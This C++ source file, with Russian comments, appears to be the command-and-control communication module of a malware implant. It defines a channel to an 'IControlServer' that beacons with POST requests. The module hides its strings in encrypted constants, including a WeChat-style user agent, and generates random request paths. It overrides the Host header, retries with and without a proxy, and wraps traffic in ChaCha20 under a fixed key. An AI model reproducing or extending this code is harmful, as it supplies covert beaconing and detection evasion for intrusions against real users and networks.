#include "NetChannel.hpp"
#include "utils.hpp"
#include "strings.hpp"

#ifdef _DEBUG_CHANNEL
DebugFileChannel::DebugFileChannel()
{


	RtlSecureZeroMemory(this->wchNameInput, sizeof(this->wchNameInput));
	RtlSecureZeroMemory(this->wchNameOutput, sizeof(this->wchNameOutput));

	this->bRootChannel = TRUE;
	this->hMutex = NULL;
	this->hMutex = CreateMutexW(NULL, FALSE, L"Local\\DebugFileChannel");

	if ((GetLastError() == ERROR_ACCESS_DENIED) || (GetLastError() == ERROR_ALREADY_EXISTS))
	{
#ifdef _DEBUG
		WriteLog(L"[DebugFileChannel] constructing non-root channel: already has main DebugFileChannel allocated before");
#endif
		this->bRootChannel = FALSE;
		wsprintfW(this->wchNameInput, L"response_%d.bin", GetTickCount());
		wsprintfW(this->wchNameOutput, L"request_%d.bin", GetTickCount());
	}
	else
	{
		wsprintfW(this->wchNameInput, L"response.bin");
		wsprintfW(this->wchNameOutput, L"request.bin");
		AllocConsole();
	}

	this->pEncryptTraffic = nullptr;
	this->pDecryptTraffic = nullptr;
	this->hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
	this->hStdInput = GetStdHandle(STD_INPUT_HANDLE);
}

DebugFileChannel::~DebugFileChannel()
{
	if (this->bRootChannel)
		FreeConsole();
	if (this->hMutex)
		CloseHandle(this->hMutex);
}

VOID DebugFileChannel::init(fnEncryptTraffic _EncryptTraffic, fnDecryptTraffic _DecryptTraffic, DWORD dwLimit, blob *extraParameter)
{
#ifdef _DEBUG
	if ((_EncryptTraffic != nullptr) && (_DecryptTraffic != nullptr))
		WriteLog(L"[DebugFileChannel::init] set _EncryptTraffic and _DecryptTraffic");
	else
		WriteLog(L"[DebugFileChannel::init] _EncrytTraffic and _DecryptTraffic = nullptr, NO ENCRYPTION");
#endif

	this->pEncryptTraffic = _EncryptTraffic;
	this->pDecryptTraffic = _DecryptTraffic;
}

BOOL DebugFileChannel::Dump2File(PWCHAR wchName, LPBYTE lpData, SIZE_T dwSize)
{
	HANDLE hFile = CreateFileW(wchName, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	DWORD dwWritten;
	BOOL bRet = WriteFile(hFile, lpData, dwSize, &dwWritten, 0);

	CloseHandle(hFile);

	return bRet;
}

BOOL DebugFileChannel::ReadFromFile(PWCHAR pwFile, LPBYTE *lpOutput, SIZE_T *dwOutputSize)
{
	HANDLE hFile = CreateFileW(pwFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	BOOL bRet = FALSE;
	DWORD dwSize = GetFileSize(hFile, 0);
	LPBYTE lpBuffer = (LPBYTE)VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpBuffer)
	{
		bRet = ReadFile(hFile, lpBuffer, dwSize, (LPDWORD)dwOutputSize, NULL);
		if (bRet)
		{
			*lpOutput = lpBuffer;
		}
		else
		{
			*dwOutputSize = 0;
			VirtualFree(lpBuffer, 0, MEM_RELEASE);
		}
	}

	CloseHandle(hFile);

	return bRet;
}

BOOL DebugFileChannel::send(PWCHAR lpIpAddress, PWCHAR pwDomain, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE * lpResponse, PSIZE_T pdwResponseSize)
{
	WCHAR debugOut[1024];

#ifdef _DEBUG
	wsprintfW(debugOut, L"[DebugFileChannel::send] sending %d bytes into %s | save response to %s and press enter...", dwDataSize, this->wchNameOutput, this->wchNameInput);
	WriteLog(debugOut);
#else
	wcscpy(debugOut, L"debug is disabled");
#endif

	if (!this->Dump2File(this->wchNameOutput, lpData, dwDataSize))
		return FALSE;

	if (!this->PrintData(debugOut, wcslen(debugOut)))
		return FALSE;

	if (!this->ReadData((PWCHAR*)lpResponse, pdwResponseSize))
		return FALSE;

#ifdef _DEBUG
	wsprintfW(debugOut, L"[DebugFileChannel::send] read %d bytes data", *pdwResponseSize);
	WriteLog(debugOut);
#endif

	return TRUE;
}

BOOL DebugFileChannel::PrintData(PWCHAR pwData, SIZE_T dwDataSize)
{
	DWORD dwWritten;
	return WriteConsoleW(this->hStdOutput, pwData, dwDataSize, &dwWritten, NULL);
}

BOOL DebugFileChannel::ReadData(PWCHAR * pwData, PSIZE_T pdwDataSize)
{
	WCHAR dummyBuf[64];
	DWORD dwRead;
	
	if (!ReadConsoleW(this->hStdInput, dummyBuf, 2, &dwRead, NULL))
		return FALSE;

	if (!this->ReadFromFile(this->wchNameInput, (LPBYTE*)pwData, pdwDataSize))
		return FALSE;

	return TRUE;
}
#else


WinHttpChannel::WinHttpChannel()
{
#ifdef _DEBUG
	WriteLog(L"[WinHttpChannel] constructor");
#endif
	this->pDecryptTraffic = nullptr;
	this->pEncryptTraffic = nullptr;
	this->hHeap = NULL;
	this->dwSeed = GetTickCount();
}

WinHttpChannel::~WinHttpChannel()
{
	if (this->hHeap != NULL)
	{
		HeapDestroy(this->hHeap);
		this->hHeap = NULL;
	}
#ifdef _DEBUG
	WriteLog(L"[WinHttpChannel] destructor");
#endif
}


VOID WinHttpChannel::init(fnEncryptTraffic _EncryptTraffic, fnDecryptTraffic _DecryptTraffic, DWORD dwLimit, blob *extraParameter)
{
#ifdef _DEBUG
	if ((_EncryptTraffic != nullptr) && (_DecryptTraffic != nullptr))
		WriteLog(L"[WinHttpChannel::init] set _EncryptTraffic and _DecryptTraffic");
	else
		WriteLog(L"[WinHttpChannel::init] _EncrytTraffic and _DecryptTraffic = nullptr, NO ENCRYPTION");
#endif

	this->pEncryptTraffic = _EncryptTraffic;
	this->pDecryptTraffic = _DecryptTraffic;
	this->dwReplyLimit = dwLimit;
	if ((extraParameter != nullptr) && (extraParameter->dwBufSize == sizeof(WinHttpParameter)))
		this->param = (WinHttpParameter*)extraParameter->lpBuffer;

	this->hHeap = HeapCreate(NULL, NULL, NULL);

	return;
}

BOOL WinHttpChannel::send(PWCHAR lpIpAddress, PWCHAR pwDomain, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE * lpResponse, PSIZE_T pdwResponseSize)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[WinHttpChannel::send] sending data to %s as host: %s, sizeof data %d with reply limit %d", lpIpAddress, pwDomain, dwDataSize, this->dwReplyLimit);
	WriteLog(debugOut);
#endif

	CCryptString cStr_useragent(cryptedstr_useragentwechat);

	BOOL bRet = FALSE;
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;
	DWORD dwNumberOfBytesAvailable = 0;
	LPBYTE lpResponseBuffer = nullptr;
	SIZE_T dwResponseBufferSize = 0;

	blob blEncryptedData;
	blob blDataSend;
	RtlSecureZeroMemory(&blDataSend, sizeof(blDataSend));
	RtlSecureZeroMemory(&blEncryptedData, sizeof(blEncryptedData));

	do
	{
		if (this->hHeap == NULL)
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::send] error heap is zero");
#endif
			break;
		}

		hSession = WinHttpOpen(cStr_useragent.w_str(), this->param->dwAccessType, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, NULL);
		if (hSession == NULL)
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::send] error WinHttpOpen");
#endif
			break;
		}

		blDataSend.lpBuffer = lpData;
		blDataSend.dwBufSize = dwDataSize;
		if ((this->pEncryptTraffic != nullptr) && (this->pEncryptTraffic(lpData, dwDataSize, &blEncryptedData.lpBuffer, &blEncryptedData.dwBufSize)))
		{
			blDataSend.lpBuffer = blEncryptedData.lpBuffer;
			blDataSend.dwBufSize = blEncryptedData.dwBufSize;
		}

		if (!this->sendRequest(hSession, &hConnect, &hRequest, lpIpAddress, pwDomain, blDataSend.lpBuffer, blDataSend.dwBufSize))
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::send] error cant connect and send request");
#endif
			break;
		}

		if (!this->readResponse(hRequest, &lpResponseBuffer, &dwResponseBufferSize))
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::send] error cant read response");
#endif
			break;
		}

		if ((lpResponseBuffer == nullptr) || (dwResponseBufferSize == 0))
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::send] data sent, got 200 OK but no content, exiting");
#endif
			bRet = TRUE;
			break;
		}

#ifdef _DEBUG
		this->savedebug(lpResponseBuffer, dwResponseBufferSize, lpData, dwDataSize);
#endif

		if (this->pDecryptTraffic == nullptr)
		{

			*lpResponse = lpResponseBuffer;
			*pdwResponseSize = dwResponseBufferSize;

			bRet = TRUE;
			break;
		}

		// если задан pDecryptTraffic, значит ожидаемо он должен быть зашифрован, расшифруем...
		if (!this->pDecryptTraffic(lpResponseBuffer, dwResponseBufferSize, lpResponse, pdwResponseSize))
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::read] error cant decrypt traffic");
#endif
			break;
		}

		bRet = TRUE;

	} while (FALSE);

	// освободим зашифрованную версию ответа, ибо нам она более не нужна
	if ((this->pDecryptTraffic != nullptr) && (lpResponseBuffer != nullptr))
		delete[]lpResponseBuffer;

	if (blEncryptedData.lpBuffer != nullptr)
	{
		delete[]blEncryptedData.lpBuffer;
		RtlSecureZeroMemory(&blEncryptedData, sizeof(blEncryptedData));
	}

	if (hRequest)
		WinHttpCloseHandle(hRequest);

	if (hConnect)
		WinHttpCloseHandle(hConnect);

	if (hSession)
		WinHttpCloseHandle(hSession);

	return bRet;
}

BOOL WinHttpChannel::sendRequest(HINTERNET hSession, HINTERNET *hConnect, HINTERNET *hRequest, PWCHAR lpIpAddress, PWCHAR pwDomain, LPBYTE lpData, SIZE_T dwDataSize)
{
	CCryptString cStr_hostheader(cryptedstr_hostheader);
	CCryptString cStr_post(cryptedstr_post);

	BOOL bRet = FALSE;
	PWCHAR pwObjectString = nullptr;
	HINTERNET hTmpConnect = NULL;
	HINTERNET hTmpRequest = NULL;
	hTmpConnect = WinHttpConnect(hSession, lpIpAddress, INTERNET_DEFAULT_HTTP_PORT, NULL);
	PWCHAR pwDomainHeader = nullptr;
	do
	{
		if (hTmpConnect == NULL)
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::sendRequest] error WinHttpConnect");
#endif
			break;
		}

		pwObjectString = this->getObjectStr();
		if (pwObjectString == nullptr)
			break;

		hTmpRequest = WinHttpOpenRequest(hTmpConnect, cStr_post.w_str(), pwObjectString, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
		if (hTmpRequest == NULL)
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::sendRequest] error WinHttpOpenRequest");
#endif
			break;
		}

		if (pwDomain != nullptr)
		{
			pwDomainHeader = new WCHAR[wcslen(cStr_hostheader.w_str()) + wcslen(pwDomain) + 12];
			if (pwDomainHeader == nullptr)
				break;

			wcscpy(pwDomainHeader, cStr_hostheader.w_str());
			wcscat(pwDomainHeader, pwDomain);

			if (!WinHttpAddRequestHeaders(hTmpRequest, pwDomainHeader, -1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE))
			{
#ifdef _DEBUG
				WriteLog(L"[WinHttpChannel::sendRequest] error cant add Host: string, skipping header addition");
#endif
			}

#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::sendRequest] added header: ", pwDomainHeader);
#endif
		}

		if (!WinHttpSendRequest(hTmpRequest, NULL, NULL, lpData, dwDataSize, dwDataSize, NULL))
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::sendRequest] error WinHttpSendRequest");
#endif
			break;
		}

		bRet = TRUE;

	} while (FALSE);

	if (pwObjectString != nullptr)
		delete[]pwObjectString;

	if (pwDomainHeader != nullptr)
		delete[]pwDomainHeader;

	*hConnect = hTmpConnect;
	*hRequest = hTmpRequest;

	return bRet;
}

BOOL WinHttpChannel::readResponse(HINTERNET hRequest, LPBYTE * lpResponse, PSIZE_T dwResponseSize)
{
	BOOL bRet = FALSE;

#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif


	DWORD dwAvailableSize = 0;
	DWORD dwRead = 0;
	LPBYTE lpTmpBuffer = nullptr;
	chunked_response_list *pcrlEntry = nullptr;
	PSIZE_T pdwcrlDataSize = nullptr;
	blob bResultBuffer;
	RtlSecureZeroMemory(&bResultBuffer, sizeof(bResultBuffer));

	do
	{
		if (!WinHttpReceiveResponse(hRequest, NULL))
		{
#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::readResponse] error WinHttpReceiveResponse");
#endif
			break;
		}

		while (TRUE)
		{
			pdwcrlDataSize = nullptr;
			dwAvailableSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwAvailableSize))
			{
#ifdef _DEBUG
				WriteLog(L"[WinHttpChannel::readResponse] error cant query available data");
#endif
				break;
			}


#ifdef _DEBUG
			wsprintfW(debugOut, L"[WinHttpChannel::readResponse] available data %d bytes, reading...", dwAvailableSize);
			WriteLog(debugOut);
#endif

			bRet = TRUE;

			if (!dwAvailableSize)
				break;

			lpTmpBuffer = this->allocChunkedEntry(&pcrlEntry, dwAvailableSize, &pdwcrlDataSize);
			if (lpTmpBuffer == nullptr)
				break;

			RtlSecureZeroMemory(lpTmpBuffer, dwAvailableSize);

			if (!WinHttpReadData(hRequest, lpTmpBuffer, dwAvailableSize, &dwRead))
			{
#ifdef _DEBUG
				WriteLog(L"[WinHttpChannel::readResponse] error WinHttpReadData");
#endif
				break;
			}

			lpTmpBuffer = nullptr;
			*pdwcrlDataSize = dwRead;

			if (!dwRead)
				break;

			// тут несовершенный код, чья производительность падает при росте размера прочитанных данных
			/*
			lpTmpBuffer = this->reallocBytes(lpTmpBuffer, dwAvailableSize, FALSE, 0);
			if (lpTmpBuffer == nullptr)
			break;

			RtlSecureZeroMemory(lpTmpBuffer, dwAvailableSize);
			if (!WinHttpReadData(hRequest, lpTmpBuffer, dwAvailableSize, &dwRead))
			{
			#ifdef _DEBUG
			WriteLog(L"[WinHttpChannel::readResponse] error WinHttpReadData");
			#endif
			break;
			}

			if (!dwRead)
			break;

			// расширим буффер, новый размер должен быть старый плюс прочитанные данные за эту итерацию
			bResultBuffer.lpBuffer = this->reallocBytes(bResultBuffer.lpBuffer, bResultBuffer.dwBufSize + dwRead, TRUE, bResultBuffer.dwBufSize);
			if (bResultBuffer.lpBuffer == nullptr)
			break;

			_RtlCopyMemory(&bResultBuffer.lpBuffer[bResultBuffer.dwBufSize], lpTmpBuffer, dwRead);
			bResultBuffer.dwBufSize += dwRead;
			*/

		}

		if ((bRet) && (pcrlEntry != nullptr))
			bRet &= this->collapse_chunked_list(pcrlEntry, &bResultBuffer);


	} while (FALSE);

	if (lpTmpBuffer != nullptr)
		delete[]lpTmpBuffer;

	if (pcrlEntry != nullptr)
		this->destroy_chunked_list(pcrlEntry);

	*lpResponse = bResultBuffer.lpBuffer;
	*dwResponseSize = bResultBuffer.dwBufSize;

	return bRet;
}

PWCHAR WinHttpChannel::getObjectStr()
{
	PWCHAR pwResult = (PWCHAR)new BYTE[1024];
	if (pwResult == nullptr)
		return nullptr;

	RtlSecureZeroMemory(pwResult, 1024);
	UINT iStringIndex = 0;
	pwResult[iStringIndex++] = L'/';

	long holdrand = this->dwSeed;
	UINT iLen = _rand(&holdrand) % OBJECTSTR_MAXLEN + 1;
	
	for (UINT iCounter = 0; iCounter < iLen; iCounter++)
		pwResult[iStringIndex++] = ((wchar_t)_rand(&holdrand) % (L'z' - L'a')) + L'a';

#ifdef _DEBUG
	WriteLog(L"[WinHttpChannel::getObjectStr] object string: ", pwResult);
#endif

	return pwResult;
}

LPBYTE WinHttpChannel::reallocBytes(LPBYTE lpBuffer, SIZE_T dwNewSize, BOOL bPreserveBytes, DWORD dwOldSize)
{
	LPBYTE lpResult = nullptr;
	if (bPreserveBytes == FALSE)
	{
		if (lpBuffer != nullptr)
			delete[]lpBuffer;
		lpResult = new BYTE[dwNewSize + 1];
	}
	else
	{
		lpResult = new BYTE[dwNewSize + 1];
		if (lpBuffer != nullptr)
		{
			if (dwNewSize >= dwOldSize)
				_RtlCopyMemory(lpResult, lpBuffer, dwOldSize);
			delete[]lpBuffer;
		}
	}

	return lpResult;
}

LPBYTE WinHttpChannel::allocChunkedEntry(chunked_response_list **entry_ptr, SIZE_T dwAllocSize, PSIZE_T *pdwSizeEntry_out)
{
	if (entry_ptr == nullptr)
		return nullptr;

#ifdef _DEBUG
	WriteLog(L"[WinHttpChannel::allocChunkedEntry] allocating new chunked entry");
#endif

	// next будет содержать указатель на переменную указывающую на nullptr, куда мы должны записать ново-аллоцированный крайний chunked_response_list 
	chunked_response_list **next = this->get_lastaddr_tonext(entry_ptr);

	BOOL bSuccess = FALSE;
	chunked_response_list *entry = (chunked_response_list*)HeapAlloc(this->hHeap, HEAP_ZERO_MEMORY, sizeof(chunked_response_list) + 1);
	do
	{
		if ((entry == nullptr) || (next == nullptr))
			break;

		entry->data.dwBufSize = dwAllocSize;
		entry->data.lpBuffer = (LPBYTE)HeapAlloc(this->hHeap, HEAP_ZERO_MEMORY, dwAllocSize + 1);

		if (entry->data.lpBuffer == nullptr)
			break;

		*next = entry; // добавим новый элемент к списку

		if (pdwSizeEntry_out != nullptr) // если нужно вернуть адрес переменной содержащей размер буфера
			*pdwSizeEntry_out = &entry->data.dwBufSize;

		bSuccess = TRUE;

	} while (FALSE);

	if ((bSuccess == FALSE) && (entry != nullptr))
	{
		if (entry->data.lpBuffer != nullptr)
			HeapFree(this->hHeap, NULL, entry->data.lpBuffer);

		HeapFree(this->hHeap, NULL, entry);
		entry = nullptr;
	}

	if (entry != nullptr)
		return entry->data.lpBuffer;

	return nullptr;
}

VOID WinHttpChannel::destroy_chunked_list(chunked_response_list * entry)
{
#ifdef _DEBUG
	WriteLog(L"[WinHttpChannel::destroy_chunked_list] freeing list...");
#endif

	chunked_response_list *pcrlListIterator = entry;
	chunked_response_list *tmpPtr = nullptr;
	while (pcrlListIterator != nullptr)
	{
		tmpPtr = pcrlListIterator;
		pcrlListIterator = pcrlListIterator->next;

		if (tmpPtr->data.lpBuffer != nullptr)
			HeapFree(this->hHeap, NULL, tmpPtr->data.lpBuffer);
		HeapFree(this->hHeap, NULL, tmpPtr);
	}

	return;
}

BOOL WinHttpChannel::collapse_chunked_list(chunked_response_list * entry, blob * pblOutput)
{
	if ((entry == nullptr) || (pblOutput == nullptr))
		return FALSE;

	SIZE_T dwTotalSize = this->get_chunked_datasize(entry);
	if (dwTotalSize == 0)
		return TRUE;

#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[WinHttpChannel::collapse_chunked_list] collapsing total size %d into single buffer", dwTotalSize);
	WriteLog(debugOut);
#endif

	chunked_response_list *pcrlListIterator = entry;
	BOOL bRet = FALSE;
	do
	{
		pblOutput->dwBufSize = dwTotalSize;
		pblOutput->lpBuffer = new BYTE[dwTotalSize + 1];
		if (pblOutput->lpBuffer == nullptr)
			break;

		LPBYTE lpOutputBuffer = pblOutput->lpBuffer;
		pcrlListIterator = entry;
		while (pcrlListIterator != nullptr)
		{
			if ((pcrlListIterator->data.lpBuffer != nullptr) && (pcrlListIterator->data.dwBufSize > 0))
			{
				_RtlCopyMemory(lpOutputBuffer, pcrlListIterator->data.lpBuffer, pcrlListIterator->data.dwBufSize);
				lpOutputBuffer = &lpOutputBuffer[pcrlListIterator->data.dwBufSize];
			}

			pcrlListIterator = pcrlListIterator->next;
		}

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

SIZE_T WinHttpChannel::get_chunked_datasize(chunked_response_list * entry)
{
	SIZE_T dwTotalSize = 0;

	chunked_response_list *pcrlListIterator = entry;
	while (pcrlListIterator != nullptr)
	{
		if (pcrlListIterator->data.lpBuffer != nullptr)
			dwTotalSize += pcrlListIterator->data.dwBufSize;
		pcrlListIterator = pcrlListIterator->next;
	}

	return dwTotalSize;
}

chunked_response_list **WinHttpChannel::get_lastaddr_tonext(chunked_response_list ** entry_ptr)
{
	chunked_response_list **list_iterator = entry_ptr;
	chunked_response_list *entry = *list_iterator;
	// найдем последний элемент и получим указатель на указатель следующего элемента
	while (entry != nullptr)
	{
		list_iterator = &entry->next;
		entry = *list_iterator;
	}

	return list_iterator;
}

#ifdef _DEBUG
VOID WinHttpChannel::savedebug(LPBYTE lpResponseBuffer, SIZE_T dwResponseSize, LPBYTE lpRequestBuffer, SIZE_T dwRequestSize)
{
	DWORD dwWritten;
	HANDLE hFileResp = INVALID_HANDLE_VALUE;
	HANDLE hFileReq = INVALID_HANDLE_VALUE;

	WCHAR wchFileReq[1024];
	WCHAR wchFileResp[1024];
	wsprintfW(wchFileReq, L"request.%X.bin", GetTickCount());
	wsprintfW(wchFileResp, L"response.%X.bin", GetTickCount());

	hFileResp = CreateFileW(wchFileResp, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFileResp != INVALID_HANDLE_VALUE)
	{
		WriteFile(hFileResp, lpResponseBuffer, dwResponseSize, &dwWritten, NULL);
		CloseHandle(hFileResp);
	}

	hFileReq = CreateFileW(wchFileReq, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, NULL, NULL);
	if (hFileReq != INVALID_HANDLE_VALUE)
	{
		WriteFile(hFileReq, lpRequestBuffer, dwRequestSize, &dwWritten, NULL);
		CloseHandle(hFileReq);
	}

	return;
}
#endif

WinHttpAbsLayer::WinHttpAbsLayer()
{
#ifdef _DEBUG
	WriteLog(L"[WinHttpAbsLayer] constructor");
#endif
	this->dwReplyLimit = 0;
	this->dwTriesAmount = 0;
	this->pDecryptTraffic = nullptr;
	this->pEncryptTraffic = nullptr;
}

WinHttpAbsLayer::~WinHttpAbsLayer()
{
#ifdef _DEBUG
	WriteLog(L"[WinHttpAbsLayer] destructor");
#endif
}

VOID WinHttpAbsLayer::init(fnEncryptTraffic _EncryptTraffic, fnDecryptTraffic _DecryptTraffic, DWORD dwLimit, blob * extraParameter)
{

#ifdef _DEBUG
	if ((_EncryptTraffic != nullptr) && (_DecryptTraffic != nullptr))
		WriteLog(L"[WinHttpAbsLayer::init] set _EncryptTraffic and _DecryptTraffic");
	else
		WriteLog(L"[WinHttpAbsLayer::init] _EncrytTraffic and _DecryptTraffic = nullptr, NO ENCRYPTION");
#endif

	this->pEncryptTraffic = _EncryptTraffic;
	this->pDecryptTraffic = _DecryptTraffic;
	this->dwReplyLimit = dwLimit;

	return;
}

BOOL WinHttpAbsLayer::send(PWCHAR lpIpAddress, PWCHAR pwDomain, LPBYTE lpData, SIZE_T dwDataSize, LPBYTE * lpResponse, PSIZE_T pdwResponseSize)
{
	BOOL bRet = FALSE;

	WinHttpParameter httpParameter;
	blob extraParameter;

	RtlSecureZeroMemory(&httpParameter, sizeof(httpParameter));
	extraParameter.dwBufSize = sizeof(httpParameter);
	extraParameter.lpBuffer = (LPBYTE)&httpParameter;

	IControlServer *server = nullptr;
	// сначала попробуем отстучать на сервер используя прокси, если не удастся, то без прокси
	this->dwTriesAmount = 0;
	do
	{
		this->dwTriesAmount++;

		server = this->reallocServer(server);
		if (server == nullptr)
			continue;

		switch (this->dwTriesAmount - 1)
		{
		case 0:
#ifdef _DEBUG
			WriteLog(L"[WinHttpAbsLayer::send] first iteration, use proxy");
#endif
			// в зависимости от версии винды вернет нужный параметр
			httpParameter.dwAccessType = this->getCurrentProxyType();
			break;
		case 1:
#ifdef _DEBUG
			WriteLog(L"[WinHttpAbsLayer::send] second iteration, try without proxy");
#endif
			httpParameter.dwAccessType = WINHTTP_ACCESS_TYPE_NO_PROXY;
			break;
		default:
#ifdef _DEBUG
			WriteLog(L"[WinHttpAbsLayer::send] undefined iteration type");
#endif
			break;
		}

		server->init(this->pEncryptTraffic, this->pDecryptTraffic, this->dwReplyLimit, &extraParameter);

		bRet = server->send(lpIpAddress, pwDomain, lpData, dwDataSize, lpResponse, pdwResponseSize);

#ifdef _DEBUG
		if (!bRet)
			WriteLog(L"[WinHttpAbsLayer::send] error sending data to server");
#endif

	} while ((!bRet) && (this->dwTriesAmount < 2));

	if (server != nullptr)
		delete server;

	return bRet;
}

IControlServer *WinHttpAbsLayer::reallocServer(IControlServer *server)
{
	if (server != nullptr)
		delete server;

	return (IControlServer*)new WinHttpChannel;
}

DWORD WinHttpAbsLayer::getCurrentProxyType()
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif

	OSVERSIONINFOW ovi;
	RtlSecureZeroMemory(&ovi, sizeof(ovi));

	fnGetVersionExW_winhttp _GetVersionExW = nullptr;
	HMODULE hKernel32 = NULL;
	// по дефолту будем считать, что запущены на 8.1+
	DWORD dwRet = WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY;

	do
	{
		hKernel32 = GetModuleHandleW(L"kernel32.dll");
		if (hKernel32 == NULL)
			break;

		_GetVersionExW = (fnGetVersionExW_winhttp)GetProcAddress(hKernel32, "GetVersionExW");
		if (_GetVersionExW == nullptr)
			break;

		ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
		if (!_GetVersionExW(&ovi))
			break;

		// проверяем что винда именно 8, а не 8.1, поскольку если у нас нет манифеста то на 8.1 и 10 вернет 6.2 вместо 6.3 / 10, а мы не знаем есть ли у нас манифест
		BOOL bIsWin8OrGreater = ((ovi.dwMajorVersion > 6) || ((ovi.dwMajorVersion == 6) && (ovi.dwMinorVersion >= 2)));
		if (!bIsWin8OrGreater)
			dwRet = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;

#ifdef _DEBUG
		wsprintfW(debugOut, L"[WinHttpAbsLayer::getCurrentProxyType] running under %d.%d, bIsWin8OrGreater = %d", ovi.dwMajorVersion, ovi.dwMinorVersion, bIsWin8OrGreater);
		WriteLog(debugOut);
#endif

	} while (FALSE);

	return dwRet;
}

static VOID init_chachakey(u8 *key, SIZE_T dwKeyLen)
{
	for (UINT i = 0; i < dwKeyLen; i++)
		key[i] = i;

	return;
}

static VOID init_chachaiv(u8 *iv, SIZE_T dwIVLen)
{
	long holdrand = GetTickCount();

	for (UINT i = 0; i < dwIVLen; i++)
	{
		iv[i] = _rand(&holdrand) % 256;
	}

	return;
}

BOOL WINAPI netcrypto::EncryptChacha20(LPBYTE lpInputData, SIZE_T dwInputSize, LPBYTE * lpOutputData, PSIZE_T lpdwOutputDataSize)
{
	BOOL bRet = FALSE;

	netcrypto::net_encrypted_packet *pNep = nullptr;
	SIZE_T dwNEPSize = offsetof(netcrypto::net_encrypted_packet, payload) + dwInputSize;

	ECRYPT_ctx ctx;
	u8 key[ECRYPT_MAXKEYSIZE / 8];
	RtlSecureZeroMemory(key, sizeof(key));

	do
	{
		pNep = (netcrypto::net_encrypted_packet*)new BYTE[dwNEPSize + 1];
		if (pNep == nullptr)
			break;

		init_chachaiv((u8*)pNep->IV, sizeof(netcrypto::net_encrypted_packet::IV));
		init_chachakey(key, sizeof(key));

		ECRYPT_init();
		ECRYPT_keysetup(&ctx, key, ECRYPT_MAXKEYSIZE, ECRYPT_MAXIVSIZE);
		ECRYPT_ivsetup(&ctx, (const u8*)pNep->IV);

		ECRYPT_encrypt_bytes(&ctx, lpInputData, (u8*)&pNep->payload[0], dwInputSize);
		pNep->dwPayloadSize = dwInputSize;

		bRet = TRUE;

		*lpOutputData = (LPBYTE)pNep;
		*lpdwOutputDataSize = dwNEPSize;

	} while (FALSE);

	return bRet;
}

BOOL WINAPI netcrypto::DecryptChacha20(LPBYTE lpInputData, SIZE_T dwInputSize, LPBYTE * lpOutputData, PSIZE_T lpdwOutputDataSize)
{
	BOOL bRet = FALSE;

	netcrypto::net_encrypted_packet *pNep = (netcrypto::net_encrypted_packet*)lpInputData;
	// реальный размер полученного пейлоада - это весь прочитанный размер минус хидеры зашифрованного пакета
	SIZE_T dwPayloadRealSize = dwInputSize - offsetof(netcrypto::net_encrypted_packet, payload);
	LPBYTE lpResultBuffer = nullptr;

	ECRYPT_ctx ctx;
	u8 key[ECRYPT_MAXKEYSIZE / 8];
	RtlSecureZeroMemory(key, sizeof(key));

	do
	{
		if ((dwInputSize <= offsetof(netcrypto::net_encrypted_packet, payload)) || (pNep == nullptr))
		{
#ifdef _DEBUG
			WriteLog(L"[necrypto::DecryptChacha20] error: invalid packet for decryption");
#endif
			break;
		}

		// получили меньше ожидаемого, при этом мы можем допустить, что получили больше ожидаемого и в таком случае мы прочитаем лишь столько сколько потребуется
		if (pNep->dwPayloadSize > dwPayloadRealSize)
		{
#ifdef _DEBUG
			WriteLog(L"[necrypto::DecryptChacha20] error: dwPayloadSize in data is bigger than real payload size");
#endif
			break;
		}

		lpResultBuffer = new BYTE[pNep->dwPayloadSize + 1];
		if (lpResultBuffer == nullptr)
			break;

		init_chachakey(key, sizeof(key));
		ECRYPT_init();
		ECRYPT_keysetup(&ctx, key, ECRYPT_MAXKEYSIZE, ECRYPT_MAXIVSIZE);
		ECRYPT_ivsetup(&ctx, (const u8*)pNep->IV);

		ECRYPT_decrypt_bytes(&ctx, (const u8*)&pNep->payload[0], lpResultBuffer, pNep->dwPayloadSize);

		bRet = TRUE;

		*lpOutputData = lpResultBuffer;
		*lpdwOutputDataSize = pNep->dwPayloadSize;

	} while (FALSE);

	return bRet;
}

#endif